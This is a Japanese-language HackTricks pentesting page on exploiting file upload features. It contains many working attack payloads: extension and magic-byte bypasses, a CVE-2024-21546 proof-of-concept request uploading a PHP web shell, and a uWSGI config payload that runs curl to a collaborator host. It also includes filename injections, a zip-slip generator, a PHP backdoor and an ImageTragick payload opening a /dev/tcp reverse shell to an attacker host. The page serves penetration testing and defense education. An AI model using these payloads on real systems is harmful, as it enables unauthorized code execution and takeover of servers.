# ファイルアップロード

{{#include ../../banners/hacktricks-training.md}}

## ファイルアップロード 一般的な方法論

その他の有用な拡張子:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### ファイル拡張子チェックのバイパス

1. 該当する場合、前述の拡張子を**確認**してください。また大文字を使ってテストしてください：_pHp, .pHP5, .PhAr ..._
2. _実行拡張子の前に有効な拡張子を**追加**してみてください（前述の拡張子も使用）：_
- _file.png.php_
- _file.png.Php5_
3. 末尾に**特殊文字**を追加してみてください。Burpを使ってすべての**ascii**や**Unicode**文字を**bruteforce**することができます。(_注：前述の拡張子を使うこともできます_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. サーバー側の拡張子パーサーを騙すことで保護をバイパスしてみてください。例えば、拡張子を**二重化**したり、拡張子間に**ゴミデータ**（**null**バイト）を挟むなどの手法です。_より良いペイロードを作成するために、前述の拡張子を使用することもできます._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. 前述のチェックに**さらに拡張子の層**を追加してみてください:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. 実行拡張子を有効な拡張子の前に置いて、サーバーが誤設定されていることを期待してみてください。（Apacheの誤設定を悪用する際に有用で、拡張子が**_.php_**を含むが必ずしも .php で終わらない場合でもコードが実行されることがあります）:
- _ex: file.php.png_
7. **NTFS alternate data stream (ADS)** を **Windows** で使用する方法。 この場合、禁止された拡張子の後と許可された拡張子の前にコロン文字 ":" が挿入されます。その結果、サーバー上に**禁止された拡張子の空ファイル**が作成されます（例: "file.asax:.jpg"）。このファイルは後で短いファイル名を使うなどの他の手法で編集される可能性があります。パターン "**::$data**" は非空のファイルを作成するためにも使用できます。したがって、このパターンの後にドットを追加することは、さらなる制限を回避するのに有用な場合があります（例: "file.asp::$data."）
8. ファイル名の長さ制限を超えるようにしてみてください。有効な拡張子が切り取られ、悪意ある PHP が残されます。AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

一部のアップロードハンドラは、保存されるファイル名から末尾のドット文字をトリムまたは正規化します。UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) の 2.9.1 より前のバージョンでは、次の方法で拡張子検証をバイパスできます:

- 有効な画像 MIME と magic header（例: PNG の `\x89PNG\r\n\x1a\n`）を使用する。
- アップロードファイルの名前を PHP 拡張子の後にドットを付けて命名する（例: `shell.php.`）。
- サーバーは末尾のドットを取り除き `shell.php` として保存します。これはウェブで配信されるディレクトリ（デフォルトの public storage 例えば `/storage/files/`）に配置されると実行されます。

簡易 PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
保存されたパスにアクセスする（典型的には Laravel + LFM）：
```
GET /storage/files/0xdf.php?cmd=id
```
緩和策:
- unisharp/laravel-filemanager を ≥ 2.9.1 にアップグレードする。
- サーバー側で厳格な allowlists を適用し、保存されたファイル名を再検証する。
- アップロードを実行可能でない場所から配信する。

### Content-Type、magic number、Compression & Resizing の回避

- Content-Type チェックは、**Content-Type** **header** の **value** を次のように設定して回避する: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- **magic number** チェックは、ファイルの先頭に **実際の画像のバイト** を追加して回避する（_file_ コマンドを混乱させる）。またはメタデータ内にシェルを埋め込む:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` または画像内に直接ペイロードを埋め込むこともできる:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- もし画像に **圧縮が加えられる**（例: [PHP-GD](https://www.php.net/manual/fr/book.image.php) などの標準的なPHPライブラリを使用している場合）は、前述の手法は有効でない場合がある。しかし、**PLTE chunk** の [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) を使って、**圧縮を生き延びる**テキストを挿入することができる。
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- Webページが例えば PHP-GD の `imagecopyresized` や `imagecopyresampled` を使って **画像をリサイズ** している場合でも、**IDAT chunk** の [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) を使って **圧縮を生き延びる**テキストを挿入できる。
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- 画像のリサイズを生き延びるペイロードを作る別の手法として、PHP-GD の `thumbnailImage` を使用する場合がある。こちらも **tEXt chunk** の [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) を使って **圧縮を生き延びる**テキストを挿入できる。
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### 確認すべきその他のトリック

- 既にアップロードされたファイルを**rename**（拡張子を変更する）できる脆弱性を探す。
- バックドアを実行するための **Local File Inclusion** 脆弱性を探す。
- **Possible Information disclosure**:
1. 同じ名前の**同じファイル**を**複数回**（かつ**同時に**）アップロードする。
2. すでに存在する**ファイル名**や**フォルダ名**と同じ名前のファイルをアップロードする。
3. 名前が `"."`, `".."`, または `"..."` のようなファイルをアップロードする。例えば、Apache の **Windows** 環境でアプリケーションが "/www/uploads/" ディレクトリにアップロードを保存する場合、"." というファイル名は "/www/" に "uploads" というファイルを作成してしまうことがある。
4. **NTFS**（Windows）で **"…:.jpg"** のように削除しにくいファイルをアップロードする。
5. **Windows** で名前に `|<>*?”` のような無効な文字を含むファイルをアップロードする。
6. CON, PRN, AUX, NUL, COM1 ... COM9, LPT1 ... LPT9 のような **予約（禁止）名** を使って Windows にファイルをアップロードする。
- また、被害者が誤って開いたときにコードを実行する可能性のある **実行ファイル**（.exe）や、より疑われにくい **.html** をアップロードしてみる。

### Special extension tricks

PHP サーバにファイルをアップロードしようとしている場合、コードを実行するための **.htaccess** トリックを参照すること: [https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
ASP サーバにファイルをアップロードする場合は、**.config** トリックを参照してコードを実行する方法を見るとよい: ../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files

`.phar` ファイルは java の `.jar` に似ているが php 用で、php として **使用できる**（php で実行したり、スクリプト内で include したりできる）ことがある。

`.inc` 拡張子は、ファイルを **import** する目的で使われる php ファイルに使われることがあり、場合によってはこの拡張子が実行許可されていることがある。

## **Jetty RCE**

Jetty サーバに XML ファイルをアップロードできれば、[RCE が発生する可能性がある（**new \*.xml と \*.war が自動的に処理されるため**）](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**。** したがって、以下の画像にあるように、XML ファイルを `$JETTY_BASE/webapps/` にアップロードすればシェルが期待できる。

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

この脆弱性の詳細な検証については元の調査を参照: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)。

uWSGI サーバでは、`.ini` 設定ファイルを変更できる場合に Remote Command Execution (RCE) 脆弱性が悪用される可能性がある。uWSGI の設定ファイルは、"magic" 変数、プレースホルダ、演算子を組み込むための特有の構文を持つ。特に `@(filename)` のように使われる '@' 演算子はファイルの内容をインクルードするために設計されている。uWSGI がサポートする様々なスキームの中で、"exec" スキームは特に強力で、プロセスの標準出力からデータを読み取ることを可能にする。この機能は、`.ini` 設定ファイルが処理される際に Remote Command Execution や Arbitrary File Write/Read に悪用され得る。

以下は、有害な `uwsgi.ini` ファイルの例を示す。
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
The execution of the payload occurs during the parsing of the configuration file. For the configuration to be activated and parsed, the uWSGI process must either be restarted (potentially after a crash or due to a Denial of Service attack) or the file must be set to auto-reload. The auto-reload feature, if enabled, reloads the file at specified intervals upon detecting changes.

It's crucial to understand the lax nature of uWSGI's configuration file parsing. Specifically, the discussed payload can be inserted into a binary file (such as an image or PDF), further broadening the scope of potential exploitation.

## **wget File Upload/SSRF Trick**

場合によっては、サーバが**`wget`**を使って**ファイルをダウンロード**しており、あなたが**URL**を**指定**できることがあります。このようなケースでは、ダウンロードされるファイルの拡張子が許可リスト（whitelist）内にあるかをチェックして、許可されたファイルのみがダウンロードされるようにしていることがあります。しかし、**このチェックは回避可能です。**\
**最大**長の**filename**は**linux**で**255**ですが、**wget**はfilenameを**236**文字に切り詰めます。**"A"\*232+".php"+".gif"**という名前のファイルをダウンロードすると、このfilenameは**バイパス**して**チェック**をすり抜けます（この例では**".gif"**が**有効**な拡張子であるため）が、`wget`はファイル名を**"A"\*232+".php"**に**リネーム**します。
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Note that **another option** you may be thinking of to bypass this check is to make the **HTTP server redirect to a different file**, so the initial URL will bypass the check by then wget will download the redirected file with the new name. This **won't work** **unless** wget is being used with the **parameter** `--trust-server-names` because **wget will download the redirected page with the name of the file indicated in the original URL**.

## ツール

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) は、Pentesters and Bug Hunters が file upload mechanisms をテストするのを支援するために設計された強力なツールです。様々な bug bounty テクニックを活用して脆弱性の識別と悪用を簡素化し、webアプリケーション の徹底的な評価を支援します。

### Corrupting upload indices with snprintf quirks (historical)

一部のレガシーな upload handler は `snprintf()` 等を使って single-file upload から multi-file 配列を構築しており、これを利用して `_FILES` 構造を偽造させることができます。`snprintf()` の挙動の不一致や切り捨てによって、巧妙に作られた単一アップロードがサーバー側で複数のインデックス付きファイルとして見えてしまい、厳密な形状を仮定しているロジック（例えば multi-file upload として扱い安全でない分岐を取る部分）を混乱させます。今日ではニッチな問題ですが、この「index corruption」パターンは時折 CTF や古いコードベースで再出現します。

## ファイルアップロードから他の脆弱性へ

- **filename** を `../../../tmp/lol.png` に設定して **path traversal** を試みる
- **filename** を `sleep(10)-- -.jpg` に設定すると **SQL injection** を達成できる可能性がある
- **filename** を `<svg onload=alert(document.domain)>` に設定して **XSS** を達成する
- **filename** を `; sleep 10;` に設定してコマンドインジェクションをテストする（他の [command injections tricks here](../command-injection.md) を参照）
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- [**different svg payloads**](https://github.com/allanlw/svg-cheatsheet) を試す
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- サーバーに対して **image** を URL から取得させることができる場合、[SSRF](../ssrf-server-side-request-forgery/index.html) を悪用できる可能性がある。この **image** が公開サイトに保存される場合、[https://iplogger.org/invisible/](https://iplogger.org/invisible/) のような URL を指定して **訪問者の情報を盗む** ことも可能になる。
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- 特殊に細工した PDF による XSS: [以下のページは **inject PDF data to obtain JS execution** 方法を示している](../xss-cross-site-scripting/pdf-injection.md)。PDF のアップロードが可能なら、与えられた指示に従って任意の JS を実行する PDF を準備できる。
- サーバーに **antivirus** があるか確認するために \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) のコンテンツをアップロードする
- ファイルアップロード時の **size limit** があるか確認する

以下はアップロードによって達成可能なことのトップ10リスト（[here](https://twitter.com/SalahHasoneh1/status/1281274120395685889) より）:

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

他のファイルタイプについては [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) を参照してください。

## Zip/Tar ファイルが自動的に展開されるアップロード

サーバー内で展開される ZIP をアップロードできる場合、2つのことができます:

### Symlink

他のファイルへの soft links を含むリンクをアップロードし、展開されたファイルにアクセスするとリンク先のファイルへアクセスできるようにする:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### 異なるフォルダに解凍する

解凍中にディレクトリ内にファイルが予期せず作成されることは重大な問題です。悪意のあるファイルのアップロードによって OS-level command execution を防げると当初は考えられていても、ZIP archive format の階層的な圧縮サポートと directory traversal の機能が悪用される可能性があります。これにより攻撃者は対象アプリケーションの解凍機能を操作して制限を回避し、安全なアップロードディレクトリから脱出することができます。

そのようなファイルを作成する自動化された exploit が [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc) にあります。ユーティリティは次のように使用できます:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
さらに、**symlink trick with evilarc** も選択肢です。目的が `/flag.txt` のようなファイルを狙う場合、そのファイルへの symlink をシステム上に作成しておくべきです。これにより evilarc が動作中にエラーを起こさないようにできます。

Below is an example of Python code used to create a malicious zip file:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**圧縮を悪用した file spraying**

詳細は**元の投稿を確認してください**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: `$_REQUEST` 変数から渡されたコマンドを実行するPHPコードが書かれています。

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: 複数のファイルを作成し、それらを含むzipアーカイブを組み立てます。

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: zip内のファイル名をviやhex editorで変更し、"xxA"を"../"に置換してディレクトリを横断します。

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```

## ImageTragic

この内容をimage拡張子でアップロードして脆弱性を悪用します **(ImageMagick , 7.0.1-1)**（詳細は [exploit](https://www.exploit-db.com/exploits/39767) を参照）
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Embedding PHP Shell on PNG

Embedding a PHP shell in the IDAT chunk of a PNG file can effectively bypass certain image processing operations. The functions `imagecopyresized` and `imagecopyresampled` from PHP-GD are particularly relevant in this context, as they are commonly used for resizing and resampling images, respectively. The ability of the embedded PHP shell to remain unaffected by these operations is a significant advantage for certain use cases.

A detailed exploration of this technique, including its methodology and potential applications, is provided in the following article: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). This resource offers a comprehensive understanding of the process and its implications.

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot Files

Polyglot files serve as a unique tool in cybersecurity, acting as chameleons that can validly exist in multiple file formats simultaneously. An intriguing example is a [GIFAR](https://en.wikipedia.org/wiki/Gifar), a hybrid that functions both as a GIF and a RAR archive. Such files aren't limited to this pairing; combinations like GIF and JS or PPT and JS are also feasible.

The core utility of polyglot files lies in their capacity to circumvent security measures that screen files based on type. Common practice in various applications entails permitting only certain file types for upload—like JPEG, GIF, or DOC—to mitigate the risk posed by potentially harmful formats (e.g., JS, PHP, or Phar files). However, a polyglot, by conforming to the structural criteria of multiple file types, can stealthily bypass these restrictions.

Despite their adaptability, polyglots do encounter limitations. For instance, while a polyglot might simultaneously embody a PHAR file (PHp ARchive) and a JPEG, the success of its upload might hinge on the platform's file extension policies. If the system is stringent about allowable extensions, the mere structural duality of a polyglot may not suffice to guarantee its upload.

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Upload valid JSONs like if it was PDF

How to avoid file type detections by uploading a valid JSON file even if not allowed by faking a PDF file (techniques from **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: As long as the `%PDF` magic bytes are in the first 1024 bytes it’s valid (get example from post)
- **`pdflib` library**: Add a fake PDF format inside a filed of the JSON so the library thinks it’s a pdf (get example from post)
- **`file` binary**: It can read up to 1048576 bytes from a file. Just create a JSON bigger than that so it cannot parse the content as a json and then inside the JSON put the initial part of a real PDF and it’ll think it’s a PDF

## References

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

{{#include ../../banners/hacktricks-training.md}}
